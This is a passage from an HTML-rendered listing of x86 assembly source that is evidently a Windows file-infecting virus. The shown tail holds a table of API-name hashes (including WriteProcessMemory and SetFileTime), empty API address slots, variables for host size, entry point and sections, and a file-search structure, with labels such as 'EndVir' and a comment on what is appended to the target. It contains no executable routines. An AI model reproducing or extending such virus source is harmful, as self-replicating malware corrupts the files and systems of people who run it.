                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06d452a3ah</span><span class="sc0">  </span><span class="sc1">;SetFilePointer</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09f69de76h</span><span class="sc0">  </span><span class="sc1">;SetFileTime</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">03a00e23bh</span><span class="sc0">  </span><span class="sc1">;Sleep</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fae00d65h</span><span class="sc0">  </span><span class="sc1">;UnmapViewOfFile    </span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">01e9fa310h</span><span class="sc0">  </span><span class="sc1">;WriteProcessMemory </span><span class="sc0">

</span><span class="sc5">EndVir</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;What is following isn't appended to target</span><span class="sc0">

</span><span class="sc1">;ApiAddresses:</span><span class="sc0">
              
        </span><span class="sc5">_CloseHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_CreateFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_CreateFileMappingA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_CreateThread</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_FindClose</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_FindFirstFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_FindNextFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_GetCurrentProcessId</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc5">_GetDriveTypeA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc5">_GetProcAddress</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_MapViewOfFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_OpenProcess</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_SetEndOfFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_SetFilePointer</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_SetFileTime</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_Sleep</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">_WriteProcessMemory</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        
</span><span class="sc1">;Variables:</span><span class="sc0">
        </span><span class="sc5">FileHandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MapHandle</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">HostNewRawSize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MapAddress</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Counter</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Crc</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc5">Depth</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc5">ThreadID</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SectAdd</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SectN</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">RVA_EP</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         
        </span><span class="sc5">ApiOriginalAdd</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      
  
</span><span class="sc1">;search structure:</span><span class="sc0">

        </span><span class="sc5">FileAttributes</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; attributes</span><span class="sc0">
        </span><span class="sc5">CreationTime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; time of creation</span><span class="sc0">
        </span><span class="sc5">LastAccessTime</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; last access time</span><span class="sc0">
        </span><span class="sc5">LastWriteTime</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; last modificationm</span><span class="sc0">
        </span><span class="sc5">FileSizeHigh</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; filesize</span><span class="sc0">
        </span><span class="sc5">FileSize</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">Reserved0</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">Reserved1</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">FileName</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MaxPath</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; long filename</span><span class="sc0">
        </span><span class="sc5">AlternateFileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; short filename</span><span class="sc0">
        </span><span class="sc5">DirExe</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MaxPath</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">EndVir0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">
</span></div></body>
</html>
